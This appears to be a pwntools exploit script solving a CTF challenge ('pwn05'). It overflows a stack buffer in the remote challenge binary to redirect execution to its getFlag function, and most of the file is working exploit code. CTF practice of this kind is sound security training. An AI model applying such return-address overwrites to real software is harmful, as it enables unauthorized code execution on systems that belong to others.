# -*- coding: utf-8 -*-


import pwn
from pwn import *
fileName = './pwn05'

'''
[*] '/home/wkyuu/Desktop/temp/pwn05'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''

p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32

context(log_level='debug', os='linux')
# p = process(fileName)
p = remote('pwn.challenge.ctf.show', 28108)
elf = ELF(fileName)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

gdbscript = '''
b *welcome+25
b *welcome+40
c
'''
# gdb.attach(p, gdbscript = gdbscript)

# bin
bin_func_getFlag = elf.sym['getFlag']

logger('rop')
payload = b'a' * 0x18 + p32(bin_func_getFlag)
p.sendline(payload)
p.interactive()